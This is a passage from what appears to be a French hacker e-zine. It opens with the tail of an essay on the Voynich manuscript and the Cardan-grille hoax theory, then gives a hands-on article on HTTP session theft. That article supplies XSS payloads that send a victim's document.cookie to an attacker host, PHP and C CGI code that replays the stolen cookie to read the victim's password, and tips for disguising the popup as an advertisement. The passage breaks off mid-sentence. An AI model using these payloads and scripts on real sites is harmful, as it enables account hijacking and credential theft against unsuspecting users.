        d'un &quot;midfix&quot; ou d'un suffixe.</p>
      <p><br>
        L'aventurier Edward Kelley a d&ucirc;e concocter le document pour tromper 
        Rudolph II, le Saint Empereur Romain.</p>
      <p><br>
        Les autres sp&eacute;cificit&eacute;s du texte de Voynich, malgr&eacute; 
        tout, ne sont pas facilement reproductibles. Par exemple, certains caract&egrave;res 
        sont individuellement habituels mais n'apparaissent que rarement &agrave; 
        la suite. Les caract&egrave;res traduits en a, e ou l sont communs, tout 
        comme la combinaison al, mais la combinaison el est tr&egrave;s rare. 
        Cet effet ne peut &ecirc;tre reproduit en m&eacute;langeant al&eacute;atoirement 
        les caract&egrave;res d'une table, ainsi Stolfi et les autres ont rejet&eacute;s 
        cette approche. Le terme cl&eacute; ici, quoique, est &quot;al&eacute;atoirement&quot;. 
        Pour les chercheurs modernes, l'aspect al&eacute;atoire est un concept 
        de valeur inestimable. Pourtant c'est un concept d&eacute;velopp&eacute; 
        longtemps apr&egrave;s que le manuscrit ait &eacute;t&eacute; &eacute;crit. 
        Un canular m&eacute;di&eacute;val aurait probablement employ&eacute; une 
        mani&egrave;re diff&eacute;rente de combiner les syllabes qui ne pourraient 
        pas &ecirc;tre al&eacute;atoires dans le sens statistique strict. J'ai 
        commenc&eacute; &agrave; me demander si certaines des sp&eacute;cificit&eacute;s 
        du texte de Voynich pourraient &ecirc;tre la cons&eacute;quence d'un dispositif 
        obsol&egrave;te ancien.</p>
      <p><br>
        La Grille de Cardan<br>
        C'&eacute;tait comme si l'hypoth&egrave;se du canular m&eacute;ritait 
        davantage de recherche. Ma prochaine &eacute;tape &eacute;tait de tenter 
        de produire un faux document pour voir les attributs du r&eacute;sultat. 
        La premi&egrave;re question &eacute;tait, quelle technique utiliser? La 
        r&eacute;ponse d&eacute;pendait de la date &agrave; laquelle le manuscrit 
        f&ucirc;t &eacute;crit. Ayant travailler dans l'arch&eacute;ologie, un 
        domaine dans lequel dater les objets est une chose importante, je me m&eacute;fiais 
        du consensus g&eacute;n&eacute;ral des chercheurs ayant travailler sur 
        le document de Voynich disant que le manuscrit avait &eacute;t&eacute; 
        cr&eacute;&eacute; avant 1500. Il &eacute;tait illustr&eacute; dans le 
        style de la fin des ann&eacute;es 1400, mais cet attribut ne donnait pas 
        la date d'origine du document de fa&ccedil;on concluante; les travaux 
        artistiques sont toujours r&eacute;alis&eacute;s dans le style d'un peu 
        avant une p&eacute;riode, innocemment ou pour faire croire que le document 
        est plus vieux. J'ai donc recherch&eacute; une technique de codage existante 
        dans la plus grande brochette possible de dates d'origine du manuscrit--entre 
        1470 et 1608.</p>
      <p><br>
        Une possibilit&eacute; prometteuse &eacute;tait la grille de Cardan, qui 
        avait &eacute;t&eacute; invent&eacute;e par le math&eacute;maticien Italien 
        Girolamo Cardano en 1550. Elle consiste en une carte avec des fentes d&eacute;coup&eacute;es 
        dedans. Quand la grille est d&eacute;pos&eacute;e au-dessus d'un texte 
        apparemment innocent r&eacute;alis&eacute; avec la m&ecirc;me copie de 
        la carte, les fentes rev&egrave;le les mots du message cach&eacute;. <br>
        J'ai r&eacute;alis&eacute; qu'une grille de Cardan avec trois fentes pouvais 
        &ecirc;tre utilis&eacute;e pour choisir les permutations des pr&eacute;fixes, 
        des &quot;midfixes&quot; et des suffixes depuis une table pour g&eacute;n&eacute;rer 
        des mots dans le style de ceux du texte de Voynich.</p>
      <p>Une page typique du manuscrit de Voynich contient environ de 10 &agrave; 
        40 lignes, chacune constitu&eacute;e d'environ 12 mots. En utilisant le 
        mod&egrave;le trois-syllabe du texte de Voynich, une simple table de 36 
        colonnes et de 40 lignes contiendrait assez de syllabes pour produire 
        une page enti&egrave;re du manuscrit avec une grille simple. La premi&egrave;re 
        colonnes listerais les pr&eacute;fixes, la seconde les &quot;midfixes&quot; 
        et la troisi&egrave;me les suffixes; les colonnes suivantes r&eacute;p&egrave;teraient 
        ce mod&egrave;le. Vous pouvez aligner la grille au coin sup&eacute;rieur 
        gauche de la table pour cr&eacute;&eacute; le premier mot du texte de 
        Voynich et ensuite la d&eacute;placer de trois colonnes vers la droite 
        pour cr&eacute;er le prochain mot. Ou vous pouvez d&eacute;placer la grille 
        une colonne plus loin vers la droite ou sur une ligne plus basse. En positionnant 
        successivement la grille au-dessus des diff&eacute;rentes parties de la 
        table, vous pouvez cr&eacute;er des centaines de mots comme dans le texte 
        de Voynich. Et la m&ecirc;me table peut &ecirc;tre utilis&eacute;e avec 
        une grille diff&eacute;rente pour cr&eacute;er les mots de la page suivante.</p>
      <p><br>
        J'ai &eacute;labor&eacute; trois tables &agrave; la main, ce qui a pris 
        deux ou trois heures par table. Il m'a fallu deux ou trois minutes pour 
        d&eacute;couper chaque grille. (J'en ai fait 10). Apr&egrave;s cela, j'ai 
        pu g&eacute;n&eacute;rer du texte aussi vite que je pouvais le transcrire. 
        En tout, j'ai r&eacute;alis&eacute; entre 1 000 et 2 000 mots de cette 
        fa&ccedil;on.</p>
      <p><br>
        J'ai d&eacute;couvert que cette m&eacute;thode pouvait facilement reproduire 
        la plupart des sp&eacute;cificit&eacute;s du texte de Voynich. Par exemple, 
        vous pouvez vous assurer que certains caract&egrave;res ne puissent appara&icirc;tre 
        ensemble en dessinant soigneusement les tables et les grilles. Si les 
        fentes successives de la grille sont toujours sur des lignes diff&eacute;rentes, 
        alors les syllabes dans les cellules horizontalement adjacentes dans la 
        table n'appara&icirc;trons jamais ensemble, m&ecirc;me si elles peuvent 
        &ecirc;tre habituelles individuellement. La distribution binomiale des 
        tailles des mots peut &ecirc;tre g&eacute;n&eacute;r&eacute;e en m&eacute;langeant 
        des syllabes courtes, moyennes et longues dans la table. Une autre caract&eacute;ristique 
        du texte de Voynich--le fait que le premier mot d'une ligne tend &agrave; 
        &ecirc;tre plus long que les suivants--peut &ecirc;tre reproduit simplement 
        en mettant la pluspart des syllabes longues du c&ocirc;ter gauche de la 
        table.</p>
      <p><br>
        La m&eacute;thode de la grille de Cardan fait donc appara&icirc;tre qu'il 
        s'agit d'un m&eacute;canisme par lequel le manuscrit de Voynich a pu &ecirc;tre 
        cr&eacute;&eacute;. Mes reconstitutions sugg&eacute;rent qu'une personne 
        aurait pu produire le manuscrit, en incluant les illustrations, en seulement 
        trois ou quatre mois. Mais une question cruciale reste en suspend: Est-ce 
        que le manuscrit ne contient qu'un baragouin incompr&eacute;hensible ou 
        un message cod&eacute;?</p>
      <p><br>
        J'ai trouv&eacute; deux mani&egrave;res d'employer les grilles et les 
        tables pour encoder et d&eacute;coder du texte en clair. La premi&egrave;re 
        &eacute;tait un chiffrement qui convertissait le texte en clair en des 
        syllabes &quot;midfix&quot; qui sont ensuite incorpor&eacute;es dans des 
        pr&eacute;fixes et des suffixes sans signification en utilisant la technique 
        d&eacute;crite ci-dessus. La seconde technique d'encodage assignait un 
        nombre pour chaque caract&egrave;re du texte en clair et utilisait ensuite 
        ces nombres pour sp&eacute;cifier le placement de la grille de Cardan 
        au-dessus de la table. Les deux techniques, malgr&eacute; tout, produisent 
        des textes avec moins de r&eacute;p&eacute;tition de mots que le texte 
        de Voynich. Cette conclusion indique que la grille de Cardan &eacute;tait 
        en effet utilis&eacute;e pour cr&eacute;er le manuscrit de Voynich, l'auteur 
        a probablement abilement cr&eacute;&eacute; un texte sans aucun sens plut&ocirc;t 
        qu'un texte crypt&eacute;. Je n'ai trouv&eacute; aucune preuve &eacute;vidente 
        que le manuscrit contient un message cod&eacute;.</p>
      <p><br>
        Cette absence d'&eacute;vidence ne prouve pas que le manuscrit &eacute;tait 
        un canular, mais mon travail montre que la construction d'un canular aussi 
        complexe que le manuscrit de Voynich &eacute;tait en effet faisable. Cette 
        explication co&iuml;ncide avec diff&eacute;rents faits historiques intrigants: 
        John Dee, un disciple d'Elizabeth, et son d&eacute;shonorant associer 
        Edward Kelley visit&egrave;rent la court de Rudolph II durant les ann&eacute;es 
        1580. Kelley &eacute;tait un forgeur reconnu, mystique et alchimiste qui 
        connaissait les grilles de Cardan. Certains experts du manuscrit de Voynich 
        ont longtemps cruent que Kelley en &eacute;tait l'auteur.</p>
      <p><br>
        Ma subalterne, l'&eacute;tudiante Laura Aylward enqu&ecirc;te actuellement 
        pour voir si des dispositifs statistiques plus complexes du manuscrit 
        peuvent &ecirc;tre reproduit en utilisant la technique de la grille de 
        Cardan. La r&eacute;ponse &agrave; cette question n&eacute;cessitera la 
        production de grandes quantit&eacute; de texte en utilisant diff&eacute;rentes 
        tables et grilles, alors nous &eacute;crivons un logiciel permettant d'automatiser 
        la m&eacute;thode.</p>
      <p><br>
        Cette &eacute;tude nous a ouvert de nouveaux horizons quant &agrave; la 
        r&eacute;examination de probl&egrave;mes difficiles pour d&eacute;terminer 
        si des solutions possibles ont &eacute;t&eacute; n&eacute;glig&eacute;es. 
        Un bon exemple d'un tel probl&egrave;me est la question de ce qui cause 
        la maladie d'Alzheimer. Nous planifions d'examiner si notre approche pourrait 
        &ecirc;tre utilis&eacute;e pour r&eacute;&eacute;valuer les recherches 
        pr&eacute;cedentes dans ce d&eacute;sordre mental. Nos questions incluerons: 
        les investigateurs ont-ils n&eacute;glig&eacute;s un champ d'expertise 
        n&eacute;cessaire? Et y a-t-il quelques subtiles malentendus entre les 
        diff&eacute;rentes disciplines mises en application dans ce travail? Si 
        nous pouvons utiliser ce processus pour aider les chercheurs en mati&egrave;re 
        de la maladie d'Alzheimer cela nous permettra de d&eacute;couvrir de nouveaux 
        horizons tr&egrave;s prometteurs, alors un manuscrit m&eacute;di&eacute;val 
        qui ressemblait &agrave; un manuel d'alchimiste s'av&egrave;rerais &ecirc;tre 
        un avantage pour la m&eacute;decine moderne.</p>
      <p class="textpetit2"><br>
        GORDON RUGG a commenc&eacute; &agrave; &ecirc;tre int&eacute;resser par 
        le manuscrit de Voynich il y a de cela quatre ans. Au d&eacute;but il 
        le voyait simplement comme un puzzle intrigant, mais apr&egrave;s il le 
        vit comme un essai pour r&eacute;examiner des probl&egrave;mes complexes. 
        Il obtenu son Ph.D. (doctorat) en philosophie &agrave; l'Universit&eacute; 
        de Reading en 1987. Maintenant grand conf&eacute;rencier &agrave; l'Ecole 
        de Calcul et des Math&eacute;matiques (School of Computing and Mathematics) 
        &agrave; l'Universit&eacute; de Keele en Angleterre, Rugg est &eacute;diteur 
        en chef de &quot;Expert Systems&quot;: Le Journal International de l'Ing&eacute;nierie 
        Cognitive et des R&eacute;seaux Neuronnaux. Ses recherches portent sur 
        des sujets comme la nature de l'expertise et le mod&eacute;lage des informations, 
        connaissances et croyances.</p></td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="vol"></a>Vol 
      de session HTTP</td>
  </tr>
  <tr> 
    <td valign="top" class="textpetit"> <p class="texttitre">Intro</p>
      <p align="left">L&agrave; vous vous dites &quot;Tu vas voir que cet encul&eacute; 
        va nous faire un article de plus sur le XSS&quot;... Et bien vous avez 
        tort ! (ou presque.)<br>
        En fait je vais vous d&eacute;crire la derni&egrave;re &eacute;tape de 
        l'exploitation d'une faille XSS. La quasi-totalit&eacute; des articles 
        sur le sujet ne couvre pas l'exploitation &agrave; proprement parler de 
        ce type de failles.<br>
        Au mieux on vous donne un script qui r&eacute;cup&egrave;re les cookies 
        et qui les enregistre dans un fichier.... et apr&egrave;s c'est &quot;d&eacute;merdez-vous 
        !&quot;.<br>
        Ici je vais d&eacute;crire une exploitation compl&egrave;te avec vol de 
        session automatique :p</p>
      <p class="texttitre">Quelques rappels ?</p>
      <p align="left">Le XSS c'est le Cross Script Scripting. Ca consiste a faire 
        ex&eacute;cuter du code javascript dans le navigateur du client. Le truc 
        c'est bien &eacute;videmment de trouver un script qui ne filtre pas les 
        variables et va ex&eacute;cuter b&ecirc;tement ce qu'on lui passe.</p>
      <p align="left">Le HTTP et les Cookies : Le gros probl&egrave;me dans le 
        protocole HTTP est qu'il est &quot;stateless&quot;. Cela veut dire que 
        d'une page &agrave; une autre le serveur aura totalement oubli&eacute; 
        qui vous &ecirc;tes. Ce d&eacute;faut a fait un peu t&acirc;che quand 
        des sites ont voulus proposer des services comme les webmails ou les forums 
        qui doivent garder en m&eacute;moire l'identit&eacute; du visiteur tout 
        au long de sa &quot;session&quot;.<br>
        Alors comme d'habitude, au lieu de tout reprendre au d&eacute;but pour 
        faire un truc qui soit s&ucirc;r de base, les ing&eacute;nieurs ont pr&eacute;f&eacute;r&eacute; 
        bricoler un truc pas trop mal par dessus le truc d&eacute;guellase qui 
        existait : ils ont cr&eacute;e les cookies.<br>
        Aussit&ocirc;t les cookies ont &eacute;t&eacute; utilis&eacute;s pour 
        le principe de session. Il faut dire que c'est bien plus discret de mettre 
        l'ID de session dans les cookies que de le passer en argument ou que de 
        le mettre en champ cach&eacute; dans toutes les pages.</p>
      <p class="texttitre">Comment sont envoy&eacute;s les cookies ?</p>
      <p align="left">Les cookies ne sont pas envoy&eacute;s sp&eacute;cifiquement 
        par la m&eacute;thode GET ou la m&eacute;thode POST (heureusement d'ailleurs) 
        ; ils sont tout simplement mis dans les headers HTTP.<br>
        Prenons l'exemple de Caramail : vous vous connectez sur le site et vous 
        entrez votre login et votre password. Le serveur v&eacute;rifie que c'est 
        valide et vous envoie l'identifiant de session qui vous permet d'acc&egrave;der 
        &agrave; vos mails (et surtout d'&ecirc;tre le seul &agrave; lire vos 
        mails).<br>
        L'identifiant de session en question est envoy&eacute; par l'en-t&ecirc;te 
        :<br>
        <i>Set-Cookie : PHPSESSID=e67d10d30d5b170cc0950ce559632a1a</i><br>
        Ici la variable de session s'appelle PHPSESSID mais son nom pourrait tr&egrave;s 
        bien &ecirc;tre diff&eacute;rent.<br>
        Les cookies sont toujours format&eacute;s de la forme <b>nom1=valeur1; 
        nom2=valeur2; nom3=valeur3</b> etc<br>
        Par exemple le cookie aurait pu &ecirc;tre <i>PHPSESSID=382d3c6ea8a9c23829aa0acc39b0dad9; 
        path=/</i><br>
        avec deux variables.</p>
      <p align="left">Quand votre navigateur re&ccedil;oit l'en-t&ecirc;te Set-Cookie, 
        il enregistre la valeur du cookie en m&eacute;moire et surtout l'adresse 
        du serveur qui va avec. Si il ne faisait pas le lien entre les deux, le 
        navigateur pourrait envoyer le cookie &agrave; n'importe quel serveur 
        :(</p>
      <p align="left">Maintenant que votre navigateur poss&egrave;de le cookie 
        avec l'identifiant de session vous pouvez acc&egrave;der &agrave; votre 
        espace priv&eacute;. Comme HTTP est stateless votre navigateur doit renvoyer 
        le cookie &agrave; chaque requ&ecirc;te. Il l'envoit alors avec l'en-t&ecirc;te 
        suivant :<br>
        <i>Cookie : PHPSESSID=e67d10d30d5b170cc0950ce559632a1a</i></p>
      <p align="left">Le serveur a lui aussi de son c&ocirc;t&eacute; un fichier 
        correspondant &agrave; votre session. Ainsi lorsque vous cliquez sur &quot;d&eacute;connexion&quot; 
        le serveur efface ce fichier et vous ne pouvez plus acc&egrave;der &agrave; 
        votre espace priv&eacute;.</p>
      <p align="left">Vous l'avez devin&eacute;, le vol de session HTTP consiste 
        &agrave; acc&egrave;der &agrave; cet espace priv&eacute; en envoyant le 
        cookie valide alors que la session est encore ouverte. Et pour obtenir 
        ce cookie on a recours &agrave; la variable javascript document.cookie. 
        Si vous voulez en savoir plus sur l'injection XSS reportez vous &agrave; 
        l'article de MindFlayR dans MindKind11.</p>
      <p class="texttitre">Du code !! On veut du code !</p>
      <p align="left">Pour faire mes tests j'ai programm&eacute; une petite zone 
        membre que vous trouverez avec le mag (room.zip.) Cet espace permet aux 
        utilisateurs enregistr&eacute;s de s'envoyer des messages priv&eacute;s. 
        Premier probl&egrave;me : les messages ne sont pas filtr&eacute;s et l'injection 
        de code javascript est possible. Second probl&egrave;me : quand on clique 
        sur &quot;Modifier mes infos&quot; le script charge un formulaire d&eacute;j&agrave; 
        remplis :</p>
      <p align="left"><img src="vol_session_http/source_account.PNG" width="395" height="175"> 
        <br>
        Il suffit alors d'afficher la source pour avoir le mot de passe de l'utilisateur 
        en clair (ici l'utilisateur root a pour mot de passe &quot;root&quot;.)</p>
      <p align="left">L'autre utilisateur sur le syst&egrave;me (toto) est au 
        courant de cette faille. Il envoie comme message le texte <font size="2">:<br>
        </font><i>Salut root !&lt;script&gt;window.open(&quot;http://toto.com/vphp/hack.php?&quot;+document.cookie);&lt;/script&gt;<br>
        </i>Qui ouvre dans une nouvelle fen&ecirc;tre la page hack.php sur le 
        site de toto en lui passant comme argument le cookie de root.</p>
      <p align="left">Le script en question va alors r&eacute;cup&eacute;rer le 
        cookie, former une requ&ecirc;te HTTP avec ce cookie, demander la page 
        account.php (&quot;Modifier mes infos&quot;) et aura ainsi le password 
        de root.<br>
        Voivi le code :<br>
        <font face="Courier New, Courier, mono" color="#3366FF">&lt;?php</font><font face="Courier New, Courier, mono"><br>
        <font color="#333399">$request</font> = <font color="#009966">&quot;GET 
        /room/account.php HTTP/1.1\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;Host: 
        webmail.com\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;Cookie: 
        {</font><font color="#333399">$_SERVER</font><font color="#009966">['QUERY_STRING']}\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;Connection 
        :close\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;\r\n&quot;</font>;<br>
        <font color="#333399">$s</font>=<font color="#FF00FF">fsockopen</font>(<font color="#009966">&quot;webmail.com&quot;</font>,<font color="#FF9900">80</font>,<font color="#333399">$errno</font>,<font color="#333399">$errstr</font>,<font color="#FF9900">30</font>);<br>
        <font color="#FF00FF">fputs</font>(<font color="#333399">$s</font>,<font color="#333399">$request</font>);<br>
        <font color="#333399">$content</font>=<font color="#009966">''</font>;<br>
        <font color="#FF00FF">while</font>(!<font color="#FF00FF">feof</font>(<font color="#333399">$s</font>))<br>
        {<br>
        <font color="#333399">&nbsp;&nbsp;$content</font>.=<font color="#FF00FF">fgets</font>(<font color="#333399">$s</font>,4096);<br>
        }<br>
        <font color="#FF00FF">fclose</font>(<font color="#333399">$s</font>);<br>
        <font color="#333399">$f</font>=<font color="#FF00FF">fopen</font>(<font color="#009966">&quot;log.txt&quot;</font>,<font color="#009966">&quot;a&quot;</font>);<br>
        <font color="#FF00FF">fwrite</font>(<font color="#333399">$f</font>,<font color="#333399">$content</font>);<br>
        <font color="#FF00FF">fclose</font>(<font color="#333399">$f</font>);<br>
        <font color="#3366FF">?&gt;</font></font></p>
      <p align="left">Ainsi quand root va lire ses messages il va voir un message 
        de toto lui disant 'Salut root !'. En m&ecirc;me temps une fen&ecirc;tre 
        va s'ouvrir qui va r&eacute;cup&eacute;rer son cookie, lire sa page account.php 
        et l'enregistrer dans le fichier log.txt du serveur de toto.<br>
        Quelques minutes plus tard toto ouvre son fichier log.txt et il voit parmis 
        les lignes :<br>
        <i>Password : &lt;input type=&quot;password&quot; name=&quot;passe&quot; 
        value=&quot;<font color="#FF0000">root</font>&quot;&gt;</i><br>
        Malheureusement il y a plusieurs probl&egrave;mes... D'abord c'est pas 
        super discret. Il suffit de lire l'adresse de la nouvelle fen&ecirc;tre 
        pour comprendre le pi&egrave;ge. Le truc simple pour r&eacute;m&eacute;dier 
        &agrave; ce probl&egrave;me c'est de faire passer la fen&ecirc;tre qui 
        va voler le cookie pour une popup publicitaire.</p>
      <p align="left">Toto d&eacute;cide d'am&eacute;liorer sa technique. Il trouve 
        une image plus ou moins chaude pour faire croire &agrave; une pub. L'image 
        fait 165 pixel de largeur et 235 pixel de hauteur. Il modifie ensuite 
        le script qu'il envoie &agrave; root :<i><br>
        <br>
        Salut root !<br>
        &lt;script&gt;<br>
        window.open(&quot;http://toto.com/vphp/hack.php?&quot;+document.cookie,<br>
        &quot;&quot;,<br>
        &quot;toolbar=no,location=no,directories=no,menubar=no,scrollbars=no,status=no,resizable=0,width=165,height=235&quot;);<br>
        &lt;/script&gt;</i></p>
      <p align="left">De cette fa&ccedil;on lorsque root lit ses mails une popup 
        sans barre d'adresse, sans possibilit&eacute; de redimensionnement, sans 
        barre d'&eacute;tat et exactement de la taille de l'image s'affiche. De 
        son c&ocirc;t&eacute; le php de toto doit &ecirc;tre modifi&eacute; :</p>
      <p align="left"><font face="Courier New, Courier, mono">&lt;html&gt;<br>
        &lt;head&gt;&lt;title&gt;S&amp;M Airlines&lt;/title&gt;&lt;/head&gt;<br>
        &lt;body leftmargin=&quot;0&quot; topmargin=&quot;0&quot; marginwidth=&quot;0&quot; 
        marginheight=&quot;0&quot;&gt;<br>
        <font color="#3366FF">&lt;?php</font><br>
        <font color="#333399">$request</font> = <font color="#009966">&quot;GET 
        /room/account.php HTTP/1.1\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;Host: 
        webmail.com\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;Cookie: 
        {</font><font color="#333399">$_SERVER</font><font color="#009966">['QUERY_STRING']}\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;Connection 
        :close\r\n&quot;</font>;<br>
        <font color="#333399">$request</font>.= <font color="#009966">&quot;\r\n&quot;</font>;<br>
        <font color="#333399">$s</font>=<font color="#FF00FF">fsockopen</font>(<font color="#009966">&quot;webmail.com&quot;</font>,<font color="#FF9900">80</font>,<font color="#333399">$errno</font>,<font color="#333399">$errstr</font>,<font color="#FF9900">30</font>);<br>
        <font color="#FF00FF">fputs</font>(<font color="#333399">$s</font>,<font color="#333399">$request</font>);<br>
        <font color="#333399">$content</font>=<font color="#009966">''</font>;<br>
        <font color="#FF00FF">while</font>(!<font color="#FF00FF">feof</font>(<font color="#333399">$s</font>))<br>
        {<br>
        <font color="#333399">&nbsp;&nbsp;$content</font>.=<font color="#FF00FF">fgets</font>(<font color="#333399">$s</font>,4096);<br>
        }<br>
        <font color="#FF00FF">fclose</font>(<font color="#333399">$s</font>);<br>
        <font color="#333399">$f</font>=<font color="#FF00FF">fopen</font>(<font color="#009966">&quot;log.txt&quot;</font>,<font color="#009966">&quot;a&quot;</font>);<br>
        <font color="#FF00FF">fwrite</font>(<font color="#333399">$f</font>,<font color="#333399">$content</font>);<br>
        <font color="#FF00FF">fclose</font>(<font color="#333399">$f</font>);<br>
        <font color="#3366FF">?&gt;</font><br>
        &lt;img src=&quot;sm.jpeg&quot;&gt;<br>
        &lt;/body&gt;<br>
        &lt;/html&gt;</font></p>
      <p align="left">L'ilusion est maintenant parfaite. Root croit qu'il s'agit 
        d'une fen&ecirc;tre publicitaire. Petit probl&egrave;me : c'est LENT !!!! 
        c'est m&ecirc;me super lent ! (pour vous donner un autre d'id&eacute;e 
        root aurait le temps de fermer 14 popups avant que notre script finisse 
        de charger compl&eacute;tement.) &Ccedil;a c'est &agrave; cause de PHP 
        : les sockets en PHP c'est pas au point. Bref on a le concept, l'algo 
        mais pas le bon langage.<br>
        C'est pas grave on va coder un CGI en C :</p>
      <div align="left"> 
        <pre align="left"><font color="#999900">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock.h&gt;

#define	TITLE &quot;Voleur de session&quot;
#define HOST &quot;localhost&quot;
#define URI &quot;/room/account.php&quot;</font>

<font color="#3366FF">char</font> x2c(<font color="#3366FF">char</font> *what);
<font color="#3366FF">void</font> header();
<font color="#3366FF">void</font> footer();

<font color="#3366FF">int</font> main(<font color="#3366FF">int</font> argc, <font color="#3366FF">char</font> *argv[])
{
	FILE *out;
	<font color="#3366FF">char</font> requete[<font color="#336666">1024</font>];
	WSADATA wsa;
	SOCKET sock;
	SOCKADDR_IN addr;
	<font color="#3366FF">struct</font> hostent *hp;
	<font color="#3366FF">char</font> ch;

	<font color="#3366FF">char</font> *qs = (<font color="#3366FF">char</font> *)malloc(<font color="#336666">256</font>);
	<font color="#3366FF">int</font> x = <font color="#336666">0</font>, i = <font color="#336666">0</font>, c = <font color="#336666">0</font>, f = <font color="#336666">0</font>;
	qs = getenv(<font color="#FF00FF">&quot;QUERY_STRING&quot;</font>);
	<font color="#3366FF">if</font> (qs != NULL){
<font color="#009900">		/*
		 * Bout de code dont je ne connais pas l'auteur qui
		 * permet de traduire les %xx en leurs caractères.
		 */</font>
		<font color="#3366FF">for</font> (x = <font color="#336666">0</font>, i = <font color="#336666">0</font>; qs[i]; x++, i++) {
			<font color="#3366FF">if</font> ((qs[x] = qs[i]) == <font color="#FF00FF">'%'</font>) {
				qs[x] = x2c(&qs[i + 1]);
				i += 2;
			}
		}
		qs[x] = <font color="#FF00FF">'\0'</font>;

		header();

<font color="#009900">		/*
		 * Here you must put your c0d3 !
		 */</font>
		printf(<font color="#FF00FF">&quot;Ton cookie semble etre :&lt;br&gt;%s&lt;br&gt;\n&quot;</font>,qs);

		sprintf(requete,<font color="#FF00FF">&quot;GET %s HTTP/1.1\n&quot;</font>
			            <font color="#FF00FF">&quot;Host: %s\nCookie: &quot;</font>,
						URI,
						HOST);
		lstrcat(requete,qs);
		lstrcat(requete,<font color="#FF00FF">&quot;\nConnection: close\n\n&quot;</font>);
		
		printf(<font color="#FF00FF">&quot;Essayons la requete :&lt;br&gt;%s&lt;br&gt;\n&quot;</font>,requete);
		
		<font color="#3366FF">if</font>(WSAStartup(<font color="#336666">0x0101</font>,&wsa)!=<font color="#336666">0</font>)
		{
			printf(<font color="#FF00FF">&quot;Initialisation de winsock impossible!&quot;</font>);
			<font color="#3366FF">return</font> <font color="#336666">0</font>;
		}
		<font color="#3366FF">if</font>((hp = gethostbyname(HOST))==<font color="#336666">0</font>)
		{
			printf(<font color="#FF00FF">&quot;Impossible de trouver %s&quot;</font>,HOST);
			<font color="#3366FF">return</font> <font color="#336666">1</font>;
		}
		
		<font color="#3366FF">if</font>((sock = socket(AF_INET, SOCK_STREAM, <font color="#336666">0</font>))==<font color="#336666">-1</font>)
		{
			printf(<font color="#FF00FF">&quot;Pb creation socket&quot;</font>);
			<font color="#3366FF">return</font> <font color="#336666">1</font>;
		}
		addr.sin_addr=*((<font color="#3366FF">struct</font> in_addr *)hp-&gt;h_addr);
		addr.sin_family=AF_INET;
		addr.sin_port=htons(<font color="#336666">80</font>);
		
		<font color="#3366FF">if</font>(!(connect(sock,(SOCKADDR *)&addr,<font color="#3366FF">sizeof</font>(addr))))
		{
			printf(<font color="#FF00FF">&quot;Connexion OK\n&lt;br&gt;&quot;</font>);
			send(sock,requete,strlen(requete),<font color="#336666">0</font>);
			printf(<font color="#FF00FF">&quot;Data sended\n&lt;br&gt;&quot;</font>);
			printf(<font color="#FF00FF">&quot;\n&quot;</font>);
			out=fopen(<font color="#FF00FF">&quot;file.txt&quot;</font>,<font color="#FF00FF">&quot;w&quot;</font>);
			<font color="#3366FF">while</font>((recv(sock, &ch, <font color="#336666">1</font>, <font color="#336666">0</font>))==<font color="#336666">1</font>)
			{
				fputc(ch,out);
			}
			fclose(out);
		}
		<font color="#3366FF">else</font>
		{
			printf(<font color="#FF00FF">&quot;Impossible de se connecter\n&quot;</font>);
		}
		closesocket(sock);
		WSACleanup();
			  
	}
	footer();
	<font color="#3366FF">return</font> <font color="#336666">0</font>;
}

<font color="#3366FF">char</font> x2c(<font color="#3366FF">char</font> *what)
{
	<font color="#3366FF">register char</font> digit;
	
	digit = (what[<font color="#336666">0</font>] &gt;= <font color="#FF00FF">'A'</font> ? ((what[<font color="#336666">0</font>] & <font color="#336666">0xdf</font>) - <font color="#FF00FF">'A'</font>)+<font color="#336666">10</font> : (what[<font color="#336666">0</font>] - <font color="#FF00FF">'0'</font>));
	digit *= <font color="#336666">16</font>;
	digit += (what[<font color="#336666">1</font>] &gt;= <font color="#FF00FF">'A'</font> ? ((what[<font color="#336666">1</font>] & <font color="#336666">0xdf</font>) - <font color="#FF00FF">'A'</font>)+<font color="#336666">10</font> : (what[<font color="#336666">1</font>] - <font color="#FF00FF">'0'</font>));
	<font color="#3366FF">return</font> (digit);
}

<font color="#3366FF">void</font> header() {
	printf(<font color="#FF00FF">&quot;Content-type: text/html\n\n&quot;</font>);
	printf(<font color="#FF00FF">&quot;&lt;html&gt;\n&lt;head&gt;&lt;title&gt;%s&lt;/title&gt;&lt;/head&gt;\n&quot;</font>, TITLE);
	printf(<font color="#FF00FF">&quot;&lt;body&gt;\n&lt;pre&gt;\n&quot;</font>);
}

<font color="#3366FF">void</font> footer() {
	printf(<font color="#FF00FF">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;</font>);
}</pre>
        <p>C'est le CGI que j'ai cr&eacute;e pour faire mes tests. Il faudra faire 
          quelques retouches si vous d&eacute;sirez le rendre discret.<br>
          Toto compile le CGI (l'exemple ici est une version windows) et le met 
          dans son r&eacute;pertoire cgi-bin. Puis il envoie le message :<br>
          <i>Salut root ! Devines qui c'est ?&lt;script&gt;window.open(&quot;http://toto.com/cgi-bin/sess_thieft.exe?&quot;+document.cookie);&lt;/script&gt;</i></p>
        <p>Quand root lit ses mails une fen&ecirc;tre s'ouvre... aussit&ocirc;t 
          ouverte aussit&ocirc;t charg&eacute;e :) Vive le C !!<br>
          Vous trouverez une version linux du CGI avec le mag. Il suffit de faire 
          un make puis de donner l'extension cgi au programme compil&eacute; avant 
          de le placer dans cgi-bin.</p>
        <p>Bon dans l'exemple que je vous ai montr&eacute; c'&eacute;tait un cas 
          stupide mais la m&eacute;thode est toujours la m&ecirc;me. Par exemple 
          sur certains forums quand on ne se rappelle plus de son mot de passe 
          il faut cliquer sur &quot;Me rappeller mon mot de passe&quot; et on 
          re&ccedil;oit notre pass dans notre bo&icirc;te mail. Avec la m&eacute;thode 
          du vol de cookie, &agrave; la place de lire une page HTML, on va changer 
